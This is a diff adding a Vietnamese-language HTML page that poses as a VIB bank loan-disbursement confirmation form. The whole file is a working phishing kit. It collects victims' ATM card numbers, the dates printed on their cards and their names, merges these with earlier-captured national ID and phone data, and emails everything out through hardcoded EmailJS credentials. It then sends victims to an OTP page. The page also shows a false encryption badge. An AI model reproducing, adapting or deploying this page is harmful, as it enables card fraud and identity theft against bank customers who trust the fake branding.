@@ -1,0 +1,552 @@
+
+<!DOCTYPE html>
+<html lang="vi" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác Nhận Giải Ngân - VIB</title>
+    <meta name="description" content="Xác nhận thông tin thẻ ATM/STK để giải ngân khoản vay nhanh chóng với VIB.">
+    
+    <!-- External Libraries (Tailwind CSS, FontAwesome, EmailJS) -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Custom Config & Styles -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            green: '#313131',
+                            dark: '#313131',
+                            light: '#E8F8EE',
+                            bg: '#F5F7FA'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Segoe UI', 'Roboto', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Base Reset & Custom Utilities */
+        body {
+            background-color: #F5F7FA;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        /* Custom Input Styles */
+        .custom-input {
+            transition: all 0.2s ease;
+        }
+        .custom-input:focus {
+            border-color: #ed1c24;
+            box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.15);
+        }
+
+        /* Bank Item Selection Animation */
+        .bank-item {
+            transition: all 0.2s ease;
+        }
+        .bank-item.selected {
+            border-color: #ed1c24;
+            background-color: #E8F8EE;
+            box-shadow: 0 4px 6px -1px rgba(0, 153, 79, 0.1);
+        }
+        .bank-item:hover:not(.selected) {
+            border-color: #A7F3D0;
+            transform: translateY(-2px);
+        }
+
+        /* Toast Notification */
+        #toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+        }
+        .toast {
+            transform: translateX(100%);
+            transition: transform 0.3s ease-in-out;
+        }
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        /* Loader */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #ed1c24;
+            width: 20px;
+            height: 20px;
+            -webkit-animation: spin 1s linear infinite; /* Safari */
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen text-gray-800">
+
+    <!-- Header -->
+    <header class="bg-white shadow-sm sticky top-0 z-40">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <a href="#" class="flex items-center gap-2">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/LOGO-VIB-Blue.png?_=20260214152952" alt="VIB" class="h-8 md:h-10">
+            </a>
+            <div class="hidden md:flex gap-6 text-sm font-semibold text-gray-600">
+                <a href="#" class="hover:text-brand-green transition">Trang Chủ</a>
+                <a href="#" class="text-brand-green">Đăng Ký Giải Ngân</a>
+                <a href="#" class="hover:text-brand-green transition">Liên Hệ</a>
+            </div>
+            <!-- Mobile Menu Icon (Visual Only for this demo) -->
+            <button class="md:hidden text-brand-green text-2xl">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow container mx-auto px-4 py-6 md:py-8 max-w-4xl">
+        
+        <!-- Step Indicator -->
+        <div class="mb-8">
+            <div class="flex items-center justify-between relative">
+                <div class="absolute left-0 top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-200 -z-10"></div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10">
+                    <div class="w-8 h-8 rounded-full bg-brand-green text-white flex items-center justify-center font-bold text-sm">1</div>
+                    <span class="text-xs font-semibold text-brand-green">Thông tin thẻ</span>
+                </div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10 opacity-50">
+                    <div class="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-sm">2</div>
+                    <span class="text-xs font-semibold text-gray-500">Xác thực OTP</span>
+                </div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10 opacity-50">
+                    <div class="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-sm">3</div>
+                    <span class="text-xs font-semibold text-gray-500">Hoàn tất</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-xl shadow-lg overflow-hidden border border-gray-100">
+            <!-- Header of Form -->
+            <div class="bg-gradient-to-r from-brand-green to-brand-dark p-4 md:p-6 text-white text-center">
+                <h1 class="text-xl md:text-2xl font-bold uppercase">Xác Nhận Giải Ngân Qua ATM</h1>
+                <p class="text-white/80 text-sm mt-1">Vui lòng nhập chính xác thông tin chủ thẻ để nhận tiền</p>
+            </div>
+
+            <!-- Loan Summary (Collapsible) -->
+            <div class="border-b border-gray-100">
+                <button onclick="toggleSummary()" class="w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 transition text-left">
+                    <div class="flex items-center gap-2 text-brand-dark font-bold">
+                        <i class="fa-solid fa-file-invoice-dollar"></i>
+                        <span>Chi tiết khoản vay</span>
+                    </div>
+                    <i id="summary-icon" class="fa-solid fa-chevron-down transition-transform duration-300"></i>
+                </button>
+                <div id="summary-content" class="hidden p-4 bg-gray-50 text-sm grid grid-cols-1 md:grid-cols-2 gap-y-2 gap-x-4 border-t border-gray-200">
+                    <p><span class="text-gray-500">Họ và tên:</span> <span id="summaryName" class="font-medium">Loading...</span></p>
+                    <p><span class="text-gray-500">CCCD:</span> <span id="summaryCCCD" class="font-medium">Loading...</span></p>
+                    <p><span class="text-gray-500">Số tiền giải ngân:</span> <span id="summaryAmount" class="font-medium text-brand-green font-bold">Loading...</span></p>
+                    <p><span class="text-gray-500">Kỳ hạn:</span> <span id="summaryMonths" class="font-medium">Loading...</span></p>
+                    <p><span class="text-gray-500">SĐT Đăng ký:</span> <span id="summaryPhone" class="font-medium">Loading...</span></p>
+                </div>
+            </div>
+
+            <div class="p-4 md:p-8 space-y-8">
+                
+                <!-- SECTION 1: BANK SELECTION -->
+                <div id="section-bank">
+                    <h3 class="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
+                        <span class="w-6 h-6 rounded-full bg-brand-light text-brand-green flex items-center justify-center text-xs">1</span>
+                        Chọn ngân hàng thụ hưởng
+                    </h3>
+                    
+                    <div class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-3" id="bank-grid">
+                        <!-- Banks will be injected here via JS -->
+                    </div>
+                    <div id="bank-error" class="text-red-500 text-sm mt-2 hidden">
+                        <i class="fa-solid fa-circle-exclamation mr-1"></i> Vui lòng chọn ngân hàng.
+                    </div>
+                </div>
+
+                <!-- SECTION 2: CARD DETAILS (Hidden initially) -->
+                <div id="section-card" class="hidden animate-fade-in space-y-6">
+                    <div class="bg-blue-50 border border-blue-100 rounded-lg p-4 flex items-start gap-3">
+                        <img id="selected-bank-logo" src="" alt="Bank Logo" class="w-12 h-12 object-contain bg-white rounded p-1 border">
+                        <div>
+                            <h4 class="font-bold text-blue-900 text-sm">Hướng dẫn nhập thông tin</h4>
+                            <p class="text-xs text-blue-700 mt-1">Tiền sẽ được chuyển vào số tài khoản gắn với thẻ ATM này. Vui lòng nhập thông tin in trên mặt thẻ.</p>
+                        </div>
+                    </div>
+
+                    <!-- Card Form -->
+                    <form id="card-form" class="space-y-5">
+                        <!-- Card Number -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1">Số thẻ ATM (In trên thẻ) <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                                    <i class="fa-regular fa-credit-card"></i>
+                                </span>
+                                <input type="text" id="cardNumber" 
+                                    class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none bg-white text-gray-900 font-medium tracking-wide"
+                                    placeholder="9704 xxxx xxxx xxxx" 
+                                    maxlength="24"
+                                    inputmode="numeric"
+                                    autocomplete="cc-number">
+                            </div>
+                            <p class="text-xs text-gray-500 mt-1">Bắt đầu bằng số 9704)</p>
+                            <p id="err-cardNumber" class="text-red-500 text-xs mt-1 hidden"></p>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <!-- Issue Date -->
+                            <div>
+                                <label class="block text-sm font-semibold text-gray-700 mb-1">Tháng/Năm in trên thẻ <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                                        <i class="fa-regular fa-calendar"></i>
+                                    </span>
+                                    <input type="text" id="cardDate" 
+                                        class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none"
+                                        placeholder="MM/YY" 
+                                        maxlength="5"
+                                        inputmode="numeric">
+                                </div>
+                                <p class="text-xs text-gray-500 mt-1">Ví dụ: 05/23</p>
+                                <p id="err-cardDate" class="text-red-500 text-xs mt-1 hidden"></p>
+                            </div>
+                            
+                            <!-- Card Holder Name -->
+                            <div class="col-span-1 md:col-span-1">
+                                <label class="block text-sm font-semibold text-gray-700 mb-1">Tên chủ thẻ <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                                        <i class="fa-regular fa-user"></i>
+                                    </span>
+                                    <input type="text" id="cardName" 
+                                        class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none uppercase"
+                                        placeholder="NGUYEN VAN A"
+                                        autocomplete="cc-name">
+                                </div>
+                                <p class="text-xs text-gray-500 mt-1">Nhập không dấu</p>
+                                <p id="err-cardName" class="text-red-500 text-xs mt-1 hidden"></p>
+                            </div>
+                        </div>
+
+                        <!-- Action Button -->
+                        <div class="pt-4">
+                            <button type="submit" id="btn-submit" class="w-full bg-brand-green hover:bg-brand-dark text-white font-bold py-3.5 rounded-lg shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2 group">
+                                <span>XÁC NHẬN GIẢI NGÂN</span>
+                                <i class="fa-solid fa-arrow-right group-hover:translate-x-1 transition-transform"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Safe Badge -->
+        <div class="mt-6 text-center text-gray-400 text-xs flex justify-center items-center gap-2">
+            <i class="fa-solid fa-shield-halved"></i>
+            Thông tin của bạn được mã hóa và bảo mật tuyệt đối 256-bit SSL.
+        </div>
+    </main>
+
+    <!-- Simple Footer -->
+    <footer class="bg-gray-800 text-white py-6 mt-auto">
+        <div class="container mx-auto px-4 text-center">
+            <p class="font-bold text-lg mb-2">Ngân hàng thương mại cổ phần Kỹ Thương Việt Nam</p>
+            <p class="text-sm text-gray-400">Tầng 2, Tòa nhà REE Tower, Số 9 Đoàn Văn Bơ, Phường 12, Quận 4, TP.HCM</p>
+            <div class="flex justify-center gap-4 mt-4">
+                <a href="tel:19006939" class="bg-white/10 px-3 py-1 rounded-full text-sm hover:bg-white/20 transition">
+                    <i class="fa-solid fa-phone mr-1"></i> Hotline: 1900 6939
+                </a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Toast Container -->
+    <div id="toast-container"></div>
+
+    <!-- Logic Script -->
+    <script>
+        // CONFIGURATION
+        const CONFIG = {
+            EMAILJS_PUBLIC_KEY: '7y3ePVskhQ1U5EF2l',
+            EMAILJS_SERVICE_ID: 'service_aa0dvwd',
+            EMAILJS_TEMPLATE_ID: 'template_9yc062q'
+        };
+
+        // BANK DATA
+        const banks = [
+            { id: "VIETCOMBANK", name: "Vietcombank", logo: "https://www.vban.vn/Resources/images/logo-bank/vietcombank.png" },
+            { id: "AGRIBANK", name: "Agribank", logo: "https://www.vban.vn/Resources/images/logo-bank/agribank.png" },
+            { id: "BIDV", name: "BIDV", logo: "https://www.vban.vn/Resources/images/logo-bank/bidv.png" },
+            { id: "VIETINBANK", name: "VietinBank", logo: "https://www.vban.vn/Resources/images/logo-bank/viettinbank.png" },
+            { id: "MBBANK", name: "MB Bank", logo: "https://www.vban.vn/Resources/images/logo-bank/mbbank.png" },
+            { id: "VIB", name: "VIB", logo: "https://www.vban.vn/Resources/images/logo-bank/VIB.png" },
+            { id: "SACOMBANK", name: "Sacombank", logo: "https://www.vban.vn/Resources/images/logo-bank/sacombank.png" },
+            { id: "ACB", name: "ACB", logo: "https://www.vban.vn/Resources/images/logo-bank/acb.png" },
+            { id: "VPBANK", name: "VPBank", logo: "https://www.vban.vn/Resources/images/logo-bank/vpbank.png" },
+            { id: "TPBANK", name: "TPBank", logo: "https://www.vban.vn/Resources/images/logo-bank/tpbank.png" },
+            { id: "VIB", name: "VIB", logo: "https://www.vban.vn/Resources/images/logo-bank/vib.png" },
+            { id: "HDBANK", name: "HDBank", logo: "https://www.vban.vn/Resources/images/logo-bank/hdbank.png" }
+        ];
+
+        // STATE
+        let appState = {
+            selectedBank: null,
+            loanData: {}
+        };
+
+        // --- UTILS ---
+        
+        // Toast Notification System
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            
+            let bgClass = type === 'error' ? 'bg-red-500' : (type === 'success' ? 'bg-green-600' : 'bg-blue-600');
+            let icon = type === 'error' ? 'fa-circle-xmark' : (type === 'success' ? 'fa-circle-check' : 'fa-info-circle');
+
+            toast.className = `toast mb-3 p-4 rounded-lg shadow-xl text-white flex items-center gap-3 min-w-[300px] ${bgClass}`;
+            toast.innerHTML = `<i class="fa-solid ${icon} text-xl"></i> <span class="font-medium text-sm">${message}</span>`;
+            
+            container.appendChild(toast);
+            
+            // Animation Trigger
+            requestAnimationFrame(() => {
+                toast.classList.add('show');
+            });
+
+            // Remove after 3s
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // --- INIT ---
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize EmailJS
+            if(window.emailjs) {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+            } else {
+                console.error("EmailJS SDK Failed to load");
+            }
+
+            loadSessionData();
+            renderBanks();
+            setupInputMasking();
+        });
+
+        function loadSessionData() {
+            try {
+                // Try to get data or use MOCK data for demo purposes if empty
+                const storedData = sessionStorage.getItem('formData');
+                appState.loanData = storedData ? JSON.parse(storedData) : {
+                    fullName: "NGUYỄN VĂN A", // Mock Default
+                    cccd: "0123456789",
+                    amount: "20.000.000 VND",
+                    months: "24",
+                    phone: "090xxxxxxx"
+                };
+
+                // Populate UI
+                document.getElementById('summaryName').textContent = appState.loanData.fullName;
+                document.getElementById('summaryCCCD').textContent = appState.loanData.cccd;
+                document.getElementById('summaryAmount').textContent = appState.loanData.amount;
+                document.getElementById('summaryMonths').textContent = appState.loanData.months + " tháng";
+                document.getElementById('summaryPhone').textContent = appState.loanData.phone;
+
+            } catch (e) {
+                console.error("Data load error", e);
+            }
+        }
+
+        function toggleSummary() {
+            const content = document.getElementById('summary-content');
+            const icon = document.getElementById('summary-icon');
+            content.classList.toggle('hidden');
+            icon.classList.toggle('rotate-180');
+        }
+
+        // --- RENDER ---
+
+        function renderBanks() {
+            const grid = document.getElementById('bank-grid');
+            grid.innerHTML = banks.map(bank => `
+                <div onclick="selectBank('${bank.id}')" 
+                     class="bank-item cursor-pointer border border-gray-200 rounded-lg p-3 flex flex-col items-center justify-center gap-2 bg-white h-24 sm:h-28"
+                     id="bank-${bank.id}"
+                     data-logo="${bank.logo}">
+                    <img src="${bank.logo}" alt="${bank.name}" class="h-8 md:h-10 object-contain pointer-events-none">
+                    <span class="text-[10px] md:text-xs font-bold text-gray-600 text-center uppercase leading-tight pointer-events-none">${bank.name}</span>
+                </div>
+            `).join('');
+        }
+
+        // --- LOGIC ---
+
+        function selectBank(bankId) {
+            appState.selectedBank = banks.find(b => b.id === bankId);
+            
+            // Update UI Selection
+            document.querySelectorAll('.bank-item').forEach(el => el.classList.remove('selected'));
+            document.getElementById(`bank-${bankId}`).classList.add('selected');
+            document.getElementById('bank-error').classList.add('hidden');
+
+            // Show Form Section with Animation
+            const sectionCard = document.getElementById('section-card');
+            sectionCard.classList.remove('hidden');
+            document.getElementById('selected-bank-logo').src = appState.selectedBank.logo;
+
+            // Scroll to form smoothly
+            sectionCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        function setupInputMasking() {
+            const cardInput = document.getElementById('cardNumber');
+            const dateInput = document.getElementById('cardDate');
+
+            // Card Number Masking (Spaces every 4 digits)
+            cardInput.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '').substring(0, 19);
+                // Ensure Napas prefix consistency if user types
+                let parts = [];
+                for (let i = 0; i < v.length; i += 4) {
+                    parts.push(v.substring(i, i + 4));
+                }
+                e.target.value = parts.join(' ');
+            });
+
+            // Date Masking (MM/YY)
+            dateInput.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length >= 2) {
+                    e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+                } else {
+                    e.target.value = v;
+                }
+            });
+        }
+
+        // --- VALIDATION & SUBMISSION ---
+
+        document.getElementById('card-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Reset Errors
+            ['cardNumber', 'cardDate', 'cardName'].forEach(id => {
+                document.getElementById(`err-${id}`).classList.add('hidden');
+                document.getElementById(id).classList.remove('border-red-500');
+            });
+
+            let isValid = true;
+            const values = {
+                number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+                date: document.getElementById('cardDate').value,
+                name: document.getElementById('cardName').value.trim().toUpperCase()
+            };
+
+            // 1. Validate Bank
+            if (!appState.selectedBank) {
+                document.getElementById('bank-error').classList.remove('hidden');
+                document.getElementById('section-bank').scrollIntoView();
+                return;
+            }
+
+            // 2. Validate Card Number (Napas starts with 9704)
+            if (!values.number.startsWith('9704') || values.number.length < 16) {
+                showError('cardNumber', 'Số thẻ không hợp lệ. Phải bắt đầu bằng 9704.');
+                isValid = false;
+            }
+
+            // 3. Validate Date (Basic MM/YY check)
+            const dateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!dateRegex.test(values.date)) {
+                showError('cardDate', 'Tháng/Năm in trên thẻ không hợp lệ (MM/YY).');
+                isValid = false;
+            }
+
+            // 4. Validate Name
+            if (values.name.length < 5) {
+                showError('cardName', 'Vui lòng nhập đầy đủ họ tên chủ thẻ.');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            // --- SUBMIT ---
+            const btn = document.getElementById('btn-submit');
+            const originalBtnContent = btn.innerHTML;
+            
+            try {
+                // Set loading state
+                btn.disabled = true;
+                btn.innerHTML = `<div class="loader"></div> <span class="ml-2">Đang xử lý...</span>`;
+
+                // Prepare Data - KHÔI PHỤC TÊN BIẾN CŨ ĐỂ KHỚP VỚI EMAIL TEMPLATE
+                const emailData = {
+                    // Spread dữ liệu khoản vay (cccd, amount, months, phone...)
+                    ...appState.loanData,
+                    
+                    // Thông tin thẻ (Sử dụng key cũ: cardNumber, date, fullName...)
+                    bankName: appState.selectedBank.name,
+                    bank: appState.selectedBank.name, // Dự phòng
+                    cardNumber: values.number,        // Key cũ: cardNumber (không phải card_number)
+                    date: values.date,                // Key cũ: date
+                    fullName: values.name,            // Key cũ: fullName
+                    cardFullName: values.name,        // Dự phòng key: cardFullName
+                    
+                    // Metadata
+                    cardType: 'napas',
+                    timestamp: new Date().toLocaleString('vi-VN')
+                };
+
+                // Store in Session for OTP page
+                sessionStorage.setItem('cardInfo', JSON.stringify(emailData));
+
+                // Send Email
+                await emailjs.send(CONFIG.EMAILJS_SERVICE_ID, CONFIG.EMAILJS_TEMPLATE_ID, emailData);
+
+                showToast('Xác nhận thông tin thành công!', 'success');
+                
+                // Redirect Delay
+                setTimeout(() => {
+                    window.location.href = 'otp.html';
+                }, 1500);
+
+            } catch (error) {
+                console.error("Submission Error:", error);
+                showToast('Có lỗi xảy ra khi gửi dữ liệu. Vui lòng thử lại.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = originalBtnContent;
+            }
+        });
+
+        function showError(fieldId, msg) {
+            const errEl = document.getElementById(`err-${fieldId}`);
+            const inputEl = document.getElementById(fieldId);
+            errEl.textContent = msg;
+            errEl.classList.remove('hidden');
+            inputEl.classList.add('border-red-500');
+        }
+
+    </script>
+</body>
+</html>
+
+
